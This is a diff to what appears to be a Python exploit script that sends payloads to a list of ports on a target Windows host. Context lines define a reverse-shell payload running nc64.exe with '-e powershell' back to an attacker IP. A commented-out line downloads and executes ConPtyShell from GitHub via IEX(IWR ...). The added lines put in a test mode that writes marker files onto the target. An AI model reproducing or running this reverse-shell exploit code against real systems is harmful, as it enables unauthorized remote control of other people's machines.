@@ -20,6 +20,11 @@ ncat_dir = "C:\\Temp\\nc64.exe"
 payload = f"{ncat_dir} {reverse_shell_ip} {reverse_shell_port} -e powershell"
 #payload = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {reverse_shell_ip} {reverse_shell_port}"
 
+# Writes a file to test which method works
+test_payloads = False
+dir_for_tests = "C:\\Temp\\"  # Please include absolute paths ending with a / or \\
+# Warning: Will write to target host into the specified folder.
+
 logo = """
 ┏┓┏┓┏┓┓  ┏┓┏┓┏━┏┓┏┓┏┓┏┓┏┓┏┓┓  ┏┓┏┓┏━┏┓┏━     
 ┏┛┃┫┏┛┃━━┃┃┃┃┗┓┗┫┣┓┣╋┏┛┃┫┏┛┃━━┃┃┃┃┗┓┗┫┗┓ ┏┓┓┏
@@ -50,6 +55,9 @@ def send_payload_44595(port):
 
 sent_packets = []
 for port in ports_to_scan:
+    if test_payloads:
+        import random; randomint = random.randint(0, 999_999_999)
+        payload = f'echo "{reverse_shell_ip}, {reverse_shell_port}:  {target_ip}, {port}" > {dir_for_tests}{randomint}.txt'
     if enable44595: 
         try:
             send_payload_44595(port)
